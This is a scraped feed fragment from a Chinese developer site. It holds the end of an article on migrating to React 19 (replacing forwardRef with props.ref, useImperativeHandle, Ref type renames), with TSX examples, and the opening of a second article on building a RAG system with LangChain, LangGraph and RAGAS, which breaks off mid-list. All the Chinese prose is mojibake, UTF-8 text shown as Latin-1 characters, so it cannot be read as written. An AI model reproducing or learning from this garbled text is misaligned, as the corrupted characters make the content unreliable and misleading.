<li><code>RefObject</code> ä¸å†åªè¯»ï¼ˆå³ä¸å†éœ€è¦ <code>MutableRefObject</code>ï¼‰ï¼Œå¯ä»¥å…¨å±€æ›¿æ¢ <code>MutableRefObject</code> â†’ <code>RefObject</code></li>
<li><code>ForwardedRef</code> è™½ç„¶æœªæ ‡è®° <code>deprecated</code>ï¼Œä½†ä»å…¶å®ç°æ¥çœ‹ï¼Œå¯ä»¥å…¨å±€æ›¿æ¢ <code>ForwardedRef</code>â†’ <code>Ref</code></li>
</ol>
<p>ç»ˆäºä¸å†çº ç»“é‚£ä¹ˆå¤šçš„ Ref ç±»å‹äº†ã€‚</p>
<h2 data-id="heading-7">â˜„ï¸ ä» useImperativeHandle å†çœ‹ forwardRef</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Freference%2Freact%2FuseImperativeHandle" target="_blank" title="https://react.dev/reference/react/useImperativeHandle" ref="nofollow noopener noreferrer">useImperativeHandle</a> æ˜¯ä¸€ä¸ªå¯èƒ½ç›¸å¯¹æ¯”è¾ƒå†·é—¨çš„ Hookï¼Œä½†å®ƒçœŸçš„å¾ˆç®¡ç”¨ï¼Œå¯ä»¥è®©çˆ¶ç»„ä»¶è°ƒç”¨å­ç»„ä»¶æä¾›çš„æ–¹æ³•ï¼Œä»è€Œé¿å…éå¸¸ä¸ React çš„å†™æ³•ï¼ˆæ¯”å¦‚ä½¿ç”¨äº‹ä»¶é€šçŸ¥è¿™ç§è€¦åˆæ€§ã€ä¸ç¡®å®šæ€§æ¯”è¾ƒå¼ºçš„å†™æ³•ï¼‰ã€‚</p>
<p>å½“ä¸€ä¸ªç»„ä»¶å¤æ‚åˆ°ä¸€å®šç¨‹åº¦çš„æ—¶å€™ï¼Œä¸ºäº†é¿å… Props Drilling çš„é—®é¢˜ï¼Œæˆ‘é€šå¸¸ä¼šç”¨ <code>Context</code> ä½œä¸ºç»„ä»¶å†…å…¨å±€æ•°æ®çŠ¶æ€ç®¡ç†çš„å·¥å…·ã€‚æ‰€æœ‰ä¸ <code>props</code>ã€<code>state</code>ã€<code>effect</code> ç›¸å…³çš„é€»è¾‘é€šé€šåœ¨ä¸€ä¸ªä¸æ¶‰åŠ UI çš„ã€ŒModelã€å±‚è¿›è¡Œå°è£…ï¼ŒUI ä¸ Model ä¹‹é—´æƒŸä¸€çš„æ¡¥æ¢å°±æ˜¯ Hooksã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88be0b394a3345ea8b9e353d1d019cef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=66zbvvT0LYegEFFN2yEP%2BQB200A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">React â‰¤ 18 çš„ç»•è„‘å†™æ³•</h3>
<p>React 19 ä¹‹å‰ï¼Œè¿™ç§æ¨¡å¼åœ¨ä½¿ç”¨ <code>useImperativeHandle</code> çš„æ—¶å€™ä¼šå†™å‡ºå¾ˆç»•çš„ä»£ç ï¼Œä¸ºäº† <code>ref</code> èƒ½å¤Ÿæœ€ç»ˆæœ‰æ•ˆï¼Œæˆ‘éœ€è¦è‡³å°‘å†™ä¸¤æ¬¡ <code>forwardRef</code>ï¼Œè€Œä¸”æ¯”è¾ƒæ™¦æ¶©ï¼Œè¿™è®©æˆ‘è‹¦ä¸å ªè¨€ï¼ˆæ‰€ä»¥æˆ‘ä¹‹å‰å¯¹äºå†™ <code>useImperativeHandle</code> å¤šå°‘æ˜¯æœ‰äº›æƒ§æ€•çš„ï¼‰ã€‚</p>
<p>React 18 åŠä¹‹å‰ï¼Œå¯èƒ½éœ€è¦è¿™ä¹ˆå†™ã€‚</p>
<p>ç»„ä»¶ Model + UIï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>,
  <span class="hljs-title class_">ForwardedRef</span>,
  forwardRef
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> <span class="hljs-title class_">Model</span>, {
  <span class="hljs-title class_">ModelProps</span>,
  <span class="hljs-title class_">ImperativeRef</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Ui</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../ui'</span>;
  
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">forwardRef</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">TheComponent</span>(<span class="hljs-params">props: ModelProps, ref: ForwardedRef&lt;ImperativeRef&gt;</span>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Model</span> {<span class="hljs-attr">...props</span>}&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Ui</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">Model</span>&gt;</span></span>;
});
</code></pre>
<p>UI å±‚ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>,
  <span class="hljs-title class_">ForwardedRef</span>,
  useImperativeHandle,
  forwardRef
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> {  
  <span class="hljs-title class_">ImperativeRef</span>,
  useRefImperative
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">forwardRef</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">Ui</span>(<span class="hljs-params">_props: <span class="hljs-built_in">unknown</span>, ref: ForwardedRef&lt;ImperativeRef&gt;</span>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-keyword">const</span> imperativeRef = <span class="hljs-title function_">useRefImperative</span>();
  
  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> imperativeRef, [imperativeRef]);
  
  <span class="hljs-keyword">return</span> <span class="xml">&lt;... /&gt;</span>;
});
</code></pre>
<p>å¾ˆç»•ï¼Œæ˜¯ä¸æ˜¯ï¼Ÿéœ€è¦åœ¨ç»„ä»¶æœ€å¤–å±‚ï¼ŒæŠŠ <code>ref</code> ä¼ é€’åˆ° UI å±‚ï¼Œç„¶åå†åœ¨ UI å±‚ <code>useImperativeHandle</code>ï¼Œä¸ºæ­¤ï¼ŒåŸæœ¬å¯ä»¥æ— å‚çš„ UI ç»„ä»¶ï¼Œç”šè‡³è¿˜è¦å†™ä¸ª <code>_props: unknown</code>ã€‚</p>
<p>ä½†å‡¡è„‘å­ä¸å¥½ä¸€ç‚¹éƒ½æƒ³ä¸å‡ºè¿™ä¹ˆç»•çš„æ³•å­ ğŸ˜³ã€‚ä½†ä¸ºäº†èƒ½å¤Ÿåœ¨æ­£ç¡®çš„ä½ç½®ä½¿ç”¨ <code>useImperativeHandle</code>ï¼Œè¿™çš„ç¡®æ˜¯æˆ‘èƒ½æƒ³åˆ°çš„æ¯”è¾ƒã€Œé«˜æ˜ã€çš„åŠæ³•äº†ã€‚</p>
<h3 data-id="heading-9">React 19 çš„å†™æ³•</h3>
<p>React 19 å˜å¾—ç›¸å½“ç®€å•ï¼Œ<code>forwardRef</code> å…¨éƒ¨å¹²æ‰åï¼Œæ”¹é€  Model å†…éƒ¨çš„ <code>useRefImperative</code>ï¼Œä½¿ Model æ›´å†…èšï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> {  
  useImperativeHandle  
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  
  
<span class="hljs-keyword">import</span> {  
  <span class="hljs-title class_">IImperativeRef</span>  
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>;  
  
<span class="hljs-keyword">import</span> useModelProps <span class="hljs-keyword">from</span> <span class="hljs-string">'./_use-model-props'</span>;  
  
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useRefImperative</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {  
  <span class="hljs-keyword">const</span> {  
    ref  
  } = <span class="hljs-title function_">useModelProps</span>();  
    
  <span class="hljs-title function_">useImperativeHandle</span>(ref, (): <span class="hljs-function"><span class="hljs-params">IImperativeRef</span> =&gt;</span> ({  
    ...  
  }), [...]);  
}
</code></pre>
<p>ä½¿ç”¨çš„è¯ï¼Œå°±åªéœ€è¦åœ¨ UI ç»„ä»¶ï¼Œç®€å•è°ƒç”¨ä¸€ä¸‹ <code>useRefImperative</code> å³å¯ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> {  
  useRefImperative
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Ui</span>(<span class="hljs-params"/>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-title function_">useRefImperative</span>();
  
  <span class="hljs-keyword">return</span> <span class="xml">&lt;... /&gt;</span>;
});
</code></pre>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å†ä¹Ÿä¸éœ€è¦æƒ§æ€•å†™ <code>useImperativeHandle</code> äº†ã€‚</p>
<h2 data-id="heading-10">ğŸŒ ç»„ä»¶åº“æ€ä¹ˆåŠ</h2>
<p>React ç›®å‰å°šæœªå¯¹ <code>forwardRef</code> æ ‡è®° <code>deprecated</code>ï¼Œä½†ä¹Ÿè¯´ä¸ä¹…çš„å°†æ¥ä¼šè¿™ä¹ˆåšã€‚</p>
<p>ç»„ä»¶åº“å°±ä¼šæ¯”è¾ƒå°´å°¬ï¼Œè€ƒè™‘åˆ°å­˜é‡åº”ç”¨ï¼Œç»„ä»¶åº“æ²¡æ³•åœ¨å‡çº§ React 19 åç›´æ¥åºŸå¼ƒ <code>forwardRef</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç»„ä»¶åº“ä¸€æ—¶é—´è¿˜æ²¡åŠæ³•äº«å—å¼ƒç”¨ <code>forwardRef</code> çš„å¸¦æ¥çš„çº¢åˆ©ï¼Œé™¤éç»„ä»¶åº“å¯ç”¨å¤§ç‰ˆæœ¬ä¸å…¼å®¹å‡çº§ã€‚</p>
<p>æ‹¿ Antd ä¸¾ä¾‹ï¼ŒAntd 5 æ”¯æŒçš„æœ€å° React ç‰ˆæœ¬æ˜¯ 16.9.0ï¼ŒAntd 6 å´å¹¶æ²¡æœ‰ç›´æ¥æå‡åˆ° React 19ï¼Œè€Œä»…ä»…å£°æ˜æœ€å° React ç‰ˆæœ¬æ˜¯ 18ã€‚æ‰€ä»¥ï¼Œå®ƒçš„å®ç°ä¾ç„¶ä½¿ç”¨äº† <code>forwardRef</code>ï¼ˆè€Œä¸”åªèƒ½ç”¨ <code>forwardRef</code>ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b671308c65484bb6f0ce1860aadf2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=TX0m6bgKcp4FDM6H8YP%2BIPzyFQk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">ğŸª­ æ€»ç»“</h2>
<p>è¿™æ¬¡çš„å‡çº§ï¼ŒBREAK CHANGE ä¸å¤šï¼Œæ€»çš„æ¥è¯´æ¯”è¾ƒå¹³æ»‘é¡ºç•…ï¼Œæˆ‘ç”¨äº† 1 å¤©çš„æ—¶é—´å‡çº§å®Œäº†äº”ä¸ªé¡¹ç›®ï¼Œæ€»ç»“ä¸‹æ¥å°±è¿™äº›ï¼š</p>
<ol>
<li>æ‰€æœ‰çš„ <code>forwardRef</code> å¯ä»¥æ”¹æˆ <code>props.ref</code>ï¼ˆå¦‚æœæ˜¯ NPM åŒ…ï¼Œéœ€è¦å…ˆå…¼å®¹ï¼Œåå‘å¤§ç‰ˆæœ¬ï¼‰</li>
<li><code>useReducer</code> çš„ç±»å‹ä¸º BREAK CHANGEï¼Œä½†ä¹Ÿåªéœ€è¦æ”¹ç±»å‹ï¼Œä¿®æ”¹ç›¸å¯¹ç®€å•</li>
<li><code>useRef&lt;T&gt;()</code> ä¼ ç©ºå°†å¯¼è‡´æ„å»ºå¤±è´¥ï¼Œå¯æ”¹æˆ <code>useRef&lt;T&gt;(null)</code> æˆ–  <code>useRef&lt;T&gt;(undefined)</code></li>
<li><code>MutableRefObject</code> â†’ <code>RefObject</code></li>
<li><code>ForwardedRef</code>â†’ <code>Ref</code></li>
<li><code>Context.Provider</code>â†’ <code>Context</code></li>
<li>ç»„ä»¶åº“ï¼Œé™¤éå£°æ˜æ”¯æŒæœ€å° React ç‰ˆæœ¬ä¸º 19ï¼Œä¸è¦æ€ <code>fowardRef</code>ï¼ˆä¹Ÿä¸è¦ç”¨ <code>props.ref</code>ï¼‰</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰“é€ ç”Ÿäº§çº§å¤æ‚ RAG ç³»ç»Ÿï¼šLangChain, LangGraph ä¸ RAGAS å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7576129509934530579</link>    <guid>https://juejin.cn/post/7576129509934530579</guid>    <pubDate>2025-11-24T12:38:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509934530579" data-draft-id="7576129509934514195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰“é€ ç”Ÿäº§çº§å¤æ‚ RAG ç³»ç»Ÿï¼šLangChain, LangGraph ä¸ RAGAS å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="LangChain,LLM,Agent"/> <meta itemprop="datePublished" content="2025-11-24T12:38:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰“é€ ç”Ÿäº§çº§å¤æ‚ RAG ç³»ç»Ÿï¼šLangChain, LangGraph ä¸ RAGAS å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:38:54.000Z" title="Mon Nov 24 2025 12:38:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>åœ¨æ„å»º<strong>ç”Ÿäº§ç¯å¢ƒå°±ç»ª</strong>çš„ RAG ç³»ç»Ÿæ—¶ï¼Œæˆ‘ä»¬éœ€è¦çš„è¿œä¸æ­¢ç®€å•çš„â€œæ£€ç´¢-ç”Ÿæˆâ€æ­¥éª¤ã€‚ä¸€ä¸ªå¥å£®çš„ RAG å¿…é¡»å…·å¤‡æ•°æ®æ²»ç†ã€çµæ´»çš„æ£€ç´¢ç­–ç•¥ã€<strong>åå¹»è§‰ (Anti-Hallucination)</strong> Â æœºåˆ¶ã€ä»¥åŠè‡ªæˆ‘ä¼˜åŒ–çš„<strong>è§„åˆ’ä¸æ‰§è¡Œ (Planning and Execution)</strong> Â èƒ½åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ffd32e4ceb748c3af5b38ff60e10481~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=3LEh7M9WQqatKXtWVqpn%2B%2FpxkU4%3D" alt="" loading="lazy"/></p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å¦‚ä½•ç»“åˆÂ <strong>LangChainã€LangGraph</strong>Â å’ŒÂ <strong>RAGAS</strong>Â è¿™ä¸€å¥—å¼ºå¤§çš„å·¥å…·é“¾ï¼Œæ¥æ­å»ºä¸€ä¸ªå…¨æ ˆ RAG ç³»ç»Ÿã€‚æˆ‘ä»¬å°†æ¨¡æ‹ŸçœŸå®ä¸–ç•Œä¸­çš„æŒ‘æˆ˜ï¼Œå¹¶æä¾›å®ç”¨çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFareedKhan-dev%2Fcomplex-RAG-guide" target="_blank" title="https://github.com/FareedKhan-dev/complex-RAG-guide" ref="nofollow noopener noreferrer">github.com/FareedKhan-â€¦</a></p>
</blockquote>
<h3 data-id="heading-0">æ­¥éª¤1ï¼šç†è§£ RAG ç®¡é“ (Pipeline)</h3>
<p>åœ¨å¼€å§‹ç¼–ç ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¯¹è¿™ä¸ªå¤æ‚çš„ RAG ç³»ç»Ÿçš„<strong>æ ¸å¿ƒæ¶æ„</strong>æœ‰ä¸€ä¸ªæ¸…æ™°çš„è®¤è¯†ã€‚æˆ‘ä»¬çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªå¤šæ­¥éª¤çš„ã€<strong>åŸºäº Agent çš„</strong>å¾ªç¯æµç¨‹ï¼Œå®ƒé€šè¿‡ä¸æ–­åœ°<strong>è§„åˆ’ã€æ‰§è¡Œã€åæ€</strong>æ¥é€¼è¿‘æœ€ç»ˆç­”æ¡ˆã€‚</p>
<h4 data-id="heading-1">1. æ¶ˆé™¤åå·®ï¼šé—®é¢˜åŒ¿ååŒ– (Anonymize Question)</h4>
<ul>
<li><strong>ç›®æ ‡ï¼š</strong> Â é˜²æ­¢å¤§å‹è¯­è¨€æ¨¡å‹ (LLM) ä¾èµ–å…¶é¢„è®­ç»ƒçŸ¥è¯†ä¸­çš„<strong>å›ºæœ‰åå·®</strong>æˆ–<strong>èƒŒæ™¯çŸ¥è¯†</strong>æ¥å›ç­”é—®é¢˜ï¼Œä»è€Œå¼ºåˆ¶å®ƒ<strong>ä»…ä¾èµ–</strong>æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>åŠ¨ä½œï¼š</strong> Â ç³»ç»Ÿé¦–å…ˆè°ƒç”¨Â <code>anonymize_question</code>ã€‚å®ƒä¼šå°†é—®é¢˜ä¸­çš„ç‰¹å®šå®ä½“ï¼ˆå¦‚â€œå“ˆåˆ©Â·æ³¢ç‰¹â€ã€â€œä¼åœ°é­”â€ï¼‰æ›¿æ¢ä¸ºä¸­æ€§çš„<strong>å ä½ç¬¦</strong>ï¼ˆä¾‹å¦‚ï¼Œâ€œäººç‰© Xâ€ã€â€œåæ´¾ Yâ€ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-2">2. åˆ¶å®šç­–ç•¥ï¼šé«˜å±‚è§„åˆ’ (Planner)</h4>
<ul>
<li><strong>ç›®æ ‡ï¼š</strong> Â ä¸ºåŒ¿ååŒ–åçš„é—®é¢˜åˆ¶å®šä¸€ä¸ª<strong>é«˜å±‚æ¬¡ã€å¤šæ­¥éª¤</strong>çš„è§£å†³ç­–ç•¥ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong> Â å¯¹äºâ€œäººç‰© X å¦‚ä½•å‡»è´¥åæ´¾ Yï¼Ÿâ€è¿™æ ·çš„é—®é¢˜ï¼Œè§„åˆ’å™¨å¯èƒ½ä¼šåˆ¶å®šå¦‚ä¸‹è®¡åˆ’ï¼š</li>
</ul>
<ol>
<li>è¯†åˆ«äººç‰© X å’Œåæ´¾ Yã€‚</li>
<li>å®šä½ä»–ä»¬æœ€ç»ˆçš„å¯¹å³™åœºæ™¯ã€‚</li>
<li>åˆ†æäººç‰© X çš„å…·ä½“è¡ŒåŠ¨ã€‚</li>
<li>èµ·è‰ä¸€ä¸ªå®Œæ•´ç­”æ¡ˆã€‚</li>
</ol>
<h4 data-id="heading-3">3. å·¥å…·é€‰æ‹©ä¸æ‰§è¡Œï¼šä»»åŠ¡å¤„ç†å±‚ (Task Handler)</h4>
<p>è¿™æ˜¯ Agent çš„æ ¸å¿ƒ<strong>å†³ç­–ç‚¹</strong>ã€‚<code>task_handler</code>Â æ ¹æ®å½“å‰ä»»åŠ¡å’Œå·²æœ‰ä¿¡æ¯ï¼Œé€‰æ‹©æœ€åˆé€‚çš„å·¥å…·è¿›è¡Œ<strong>ä¸Šä¸‹æ–‡æ£€ç´¢</strong>æˆ–<strong>ç›´æ¥å›ç­”</strong>ã€‚å¯é€‰çš„å·¥å…·åŒ…æ‹¬ï¼š</p>






























